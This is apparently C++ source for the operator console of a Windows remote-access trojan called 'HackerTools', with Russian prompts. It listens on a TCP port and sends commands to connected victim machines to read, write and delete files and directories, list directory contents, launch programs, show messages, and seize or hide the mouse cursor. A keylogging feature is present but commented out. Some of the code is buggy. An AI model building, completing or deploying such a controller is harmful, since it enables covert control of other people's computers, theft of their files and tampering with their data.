#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

using namespace std;

string cmds;
string lol = "calc";
string cock = "makefile";
string fileedit = "edit";
string help = "help";
string dirz = "makedir";
string mousehack = "mousehack";
string msz = "msg";
string msgerror = "close";
//string keylog = "keylog";
string paint = "mspaint";
string remov = "remove";
string getcat = "getcat";
string dirz2 = "removedir";
string wait = ".";
string showf = "cat";
string ac = "getdir";
string cx = "coff";
char dirname[256];
char filename[256];
char filedata[256];
char msgtext[256];
char msgheader[256];
char filecat[256];
string um = "up";
string dm = "down";
string lm = "left";
string rm = "right";

unsigned short portnum = 1111;
char host_name[256];
char hostname[256];
struct hostent *hp;
SOCKET Connections[100];
int Counter = 0;
int sel = 0;
int mousesel = 0;
int mousesel2 = 0;


int S (int key, char *files)
{
    if ( (key == 1) || (key == 2) )
        return 0;

    FILE *Save;
    Save = fopen(files, "a+");
    cout << key << endl;
    fprintf(Save, "%s", &key);
    fclose (Save);
    return 0;
}


int error(char* reason)
{
    MessageBox(NULL, reason, "[HackerTools] Error!", MB_ICONERROR);
    WSACleanup();
    closesocket(Connections);
    exit(0);
}

int main()
{
    setlocale(LC_ALL, "Russian");
    system("color A");
    system("mode con cols=80 lines=30");
    system("title HackerTools");
    char buf[1024];
    WSAData wsaData;
    WORD DLLVersion = MAKEWORD(2, 1);
    if(WSAStartup(DLLVersion, &wsaData) != 0)
    {
        cout << DLLVersion;
        system("pause");
        return 0;
    }
    SOCKADDR_IN addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(portnum);
    gethostname(host_name, sizeof(host_name));
    hp = gethostbyname(host_name);
    if (hp == NULL)
    {
        error("Не удалось получить IP-адрес машины");
    }
    addr.sin_addr.S_un.S_un_b.s_b1 = hp->h_addr_list[0][0];
    addr.sin_addr.S_un.S_un_b.s_b2 = hp->h_addr_list[0][1];
    addr.sin_addr.S_un.S_un_b.s_b3 = hp->h_addr_list[0][2];
    addr.sin_addr.S_un.S_un_b.s_b4 = hp->h_addr_list[0][3];
    int sizeofaddr = sizeof(addr);
    SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL);
    bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
    listen(sListen, SOMAXCONN);

    cout << "...............................................................................\n";
    printf("\tСервер запущен. IP адрес: %u.%u.%u.%u:%u\n", (unsigned char)addr.sin_addr.S_un.S_un_b.s_b1,
											  		   	    (unsigned char)addr.sin_addr.S_un.S_un_b.s_b2,
											  			    (unsigned char)addr.sin_addr.S_un.S_un_b.s_b3,
											  			    (unsigned char)addr.sin_addr.S_un.S_un_b.s_b4, portnum);
    cout << "\tОжидайте подключения клиента к серверу, после чего вы можете...\n";
    cout << "\tввести команду help для получения списка доступных команд.\n";
    cout << "\tВнимание! Данная версия работает очень нестабильно.\n";
    //cout << "\t" << buf << "\n";
    cout << "...............................................................................\n";
    SOCKET newConnection;
    for(int i = 0; i < 100; i++)
    {
        newConnection = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr);

        if(newConnection == 0){
            error("Не удалось установить соединение");
            return 0;
        }
        else{
            Connections[i] = newConnection;
            Counter++;
            cout << "Клиент подключен к серверу! ID: " << Counter << "\n" << "Выберите действие: \n'1' - работать исключительно с одним клиентом\n'2' - работать с каждым клиентом по очереди [ Не стабильно ]\n";
            cout << "> ";
            cin >> sel;
            cout << "> ";
            if(sel == 1){
                while(true)
                {
                    cin >> cmds;
                    if(cmds == lol)
                    {
                        char cmd[256] = "da";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        cout << "\n> ";
                    }
                    else if(cmds == cock)
                    {
                        cout << "\n Введите название файла в формате *название.тип*: ";
                        cin >> filename;
                        char cmd[256] = "lala";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], filename, sizeof(filename), NULL);
                        cout << "\n> ";
                    }
                    else if(cmds == dirz)
                    {
                        cout << "\n Введите название директории: ";
                        cin >> dirname;
                        char cmd[256] = "mkdir";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], dirname, sizeof(dirname), NULL);
                        cout << "\n> ";
                    }
                    else if(cmds == mousehack)
                    {
                        cout << "Выберите действие: \n'1' - перехват курсора [WARNING] НЕ СТАБИЛЬНО 'ESC' завершить\n'2' - махинации с курсором\n>";
                        cin >> mousesel;
                        if(mousesel == 1)
                        {
                            char buffer[64] = "up";
                            char buffer2[64] = "down";
                            char buffer3[64] = "right";
                            char buffer4[64] = "left";
                            while(true){
                                if(GetAsyncKeyState(VK_ESCAPE))
                                {
                                    break;
                                }
                                else{
                                    Sleep(50);


                                    //double pposx = atof(posx);
                                    //double pposy = atof(posy);
                                    char cmd[256] = "mousehack";
                                    send(Connections[i], cmd, sizeof(cmd), NULL);
                                    if(GetAsyncKeyState(VK_UP))
                                    {
                                        cout << buffer;
                                        //cout << "a";
                                        send(Connections[i], buffer, sizeof(buffer), NULL);
                                    }
                                    else if(GetAsyncKeyState(VK_DOWN))
                                    {
                                        cout << buffer2;
                                        send(Connections[i], buffer2, sizeof(buffer2), NULL);
                                    }
                                    else if(GetAsyncKeyState(VK_LEFT))
                                    {
                                        cout << buffer4;
                                        send(Connections[i], buffer4, sizeof(buffer4), NULL);
                                    }
                                    else if(GetAsyncKeyState(VK_RIGHT))
                                    {
                                        cout << buffer3;
                                        send(Connections[i], buffer3, sizeof(buffer3), NULL);
                                    }
                                }
                            }
                        }
                        else if(mousesel == 2)
                        {
                            cout << "\n[MOUSE EDITOR]\n'1' - отключить курсор\n'2' - показать курсор\n>";
                            cin >> mousesel2;
                            if(mousesel2 == 1)
                            {
                                char cmd[256] = "cursoroff";
                                send(Connections[i], cmd, sizeof(cmd), NULL);
                                cout << "\nКурсор отключен\n";
                                cout << "\n>";
                            }
                            else if(mousesel2 == 2)
                            {
                                char cmd[256] = "cursor";
                                send(Connections[i], cmd, sizeof(cmd), NULL);
                                cout << "\nКурсор включен\n";
                                cout << "\n>";
                            }
                        }
                    }
                    else if(cmds == help)
                    {
                        cout << "\n|calc - start calculator|\n|makefile - make file in client directory|\n|makedir - make directory in client directory|\n|mousehack - control of client mouse|\n|edit - edit file|\n|help - this list|\n|msg - send window message to client|\n|close - destroy server|\n|mspaint - start paint|\n|remove - delete file|\n|getcat - get the client directory|\n|removedir - remove directory|\n|cat - get file content|\n|coff - close client|\n";
                        cout << "\n> ";
                    }
                    else if(cmds == fileedit)
                    {
                        cout << "\n[NEO EDITOR] Введите название файла в формате *название.тип*: ";
                        cin >> filename;
                        cout << "\n\t\t[NEO EDITOR]\n";
                        cin >> filedata;
                        char cmd[256] = "neo";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], filename, sizeof(filename), NULL);
                        send(Connections[i], filedata, sizeof(filedata), NULL);
                        cout << "\n>";
                    }
                    else if(cmds == msz)
                    {
                        cout << "\nВведите заголовок сообщения\n>";
                        cin >> msgheader;
                        cout << "\nВведите содержимое сообщения\n>";
                        cin >> msgtext;
                        char cmd[256] = "msg";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], msgheader, sizeof(msgheader), NULL);
                        send(Connections[i], msgtext, sizeof(msgtext), NULL);
                        cout << "\n>";
                    }
                    else if(cmds == msgerror)
                    {
                        error("Сервер уничтожен.");
                    }
                    else if(cmds == paint)
                    {
                        char cmd[256] = "mspaint";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        cout << "\n>";
                    }
                    else if(cmds == remov)
                    {
                        cout << "\nВведите название файла в формате *название.тип*: ";
                        cin >> filename;
                        char cmd[256] = "remove";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], filename, sizeof(filename), NULL);
                        cout << "\n>";
                    }
                    else if(cmds == getcat)
                    {
                        char cmd[256] = "getcat";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        Sleep(1000);
                        recv(Connections[i], buf, sizeof(buf), NULL);
                        cout << "\n" << buf << "\n>";
                    }
                    /*else if(cmds == keylog)
                    {
                        char q;
                        char cmd[256] = "keylog";
                        send(newConnection, cmd, sizeof(cmd), NULL);
                        while(1)
                        {
                            recv(newConnection, q, sizeof(q), NULL);
                            S(q,"C:\\log.txt");
                        }
                    }*/
                    else if(cmds == dirz2)
                    {
                        cout << "\nВведите название директории: ";
                        cin >> dirname;
                        char cmd[256] = "removedir";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], dirname, sizeof(dirname), NULL);
                        cout << "\n>";
                    }
                    else if(cmds == wait)
                    {
                        break;
                    }
                    else if(cmds == showf)
                    {
                        cout << "\nВведите название файла в формате *название.тип*: ";
                        cin >> filename;
                        char cmd[256] = "cat";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], filename, sizeof(filename), NULL);
                        Sleep(500);
                        recv(Connections[i], filecat, sizeof(filecat), NULL);
                        cout << filecat;
                        cout << "\n>";
                    }
                    else if(cmds == ac)
                    {
                        WIN32_FIND_DATA FindFileData;
                        HANDLE hf;
                        char cmd[256] = "getdir";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        Sleep(5000);
                        recv(Connections[i], FindFileData.cFileName, sizeof(FindFileData.cFileName), NULL);
                        cout << FindFileData.cFileName << "\n";
                    }
                    else if(cmds == cx)
                    {
                        char cmd[256] = "coff";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        cout << "\n>";
                    }
                }
            }
            else if(sel == 2){
                    cin >> cmds;
                    if(cmds == lol)
                    {
                        char cmd[256] = "da";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        cout << "\n> ";
                    }
                    else if(cmds == cock)
                    {
                        cout << "\n Введите название файла в формате *название.тип*: ";
                        cin >> filename;
                        char cmd[256] = "lala";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], filename, sizeof(filename), NULL);
                        cout << "\n> ";
                    }
                    else if(cmds == dirz)
                    {
                        cout << "\n Введите название директории: ";
                        cin >> dirname;
                        char cmd[256] = "mkdir";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], dirname, sizeof(dirname), NULL);
                        cout << "\n> ";
                    }
                    else if(cmds == fileedit)
                    {
                        cout << "\n[NEO EDITOR] Введите название файла в формате *название.тип*: ";
                        cin >> filename;
                        cout << "\n\t\t[NEO EDITOR]\n";
                        cin >> filedata;
                        char cmd[256] = "neo";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], filename, sizeof(filename), NULL);
                        send(Connections[i], filedata, sizeof(filedata), NULL);
                    }
                    else if(cmds == msz)
                    {
                        cout << "\nВведите заголовок сообщения\n>";
                        cin >> msgheader;
                        cout << "\nВведите содержимое сообщения\n>";
                        cin >> msgtext;
                        char cmd[256] = "msg";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], msgheader, sizeof(msgheader), NULL);
                        send(Connections[i], msgtext, sizeof(msgtext), NULL);
                        cout << "\n>";
                    }
                    else if(cmds == help)
                    {
                        cout << "\n|calc - start calculator|\n|makefile - make file in client directory|\n|makedir - make directory in client directory|\n|mousehack - control of client mouse|\n|edit - edit file|\n|help - this list|\n|msg - send window message to client|\n|close - destroy server|\n|mspaint - start paint|\n|remove - delete file|\n|getcat - get the client directory|\n|removedir - remove directory|\n";
                        cout << "\n> ";
                    }
                    else if(cmds == msgerror)
                    {
                        error("Сервер уничтожен.");
                    }
                    else if(cmds == paint)
                    {
                        char cmd[256] = "mspaint";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        cout << "\n>";
                    }
                    else if(cmds == remov)
                    {
                        cout << "\nВведите название файла в формате *название.тип*: ";
                        cin >> filename;
                        char cmd[256] = "remove";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], filename, sizeof(filename), NULL);
                        cout << "\n>";
                    }
                    else if(cmds == getcat)
                    {
                        char cmd[256] = "getcat";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        Sleep(1000);
                        recv(Connections[i], buf, sizeof(buf), NULL);
                        cout << "\n" << buf << "\n>";
                    }
                    else if(cmds == dirz2)
                    {
                        cout << "\nВведите название директории: ";
                        cin >> dirname;
                        char cmd[256] = "removedir";
                        send(Connections[i], cmd, sizeof(cmd), NULL);
                        send(Connections[i], dirname, sizeof(dirname), NULL);
                        cout << "\n>";
                    }
                    else if(cmds == wait)
                    {
                        cout << "\nОжидание подключений...\n>";
                    }
            }
    }}
    system("pause");
}
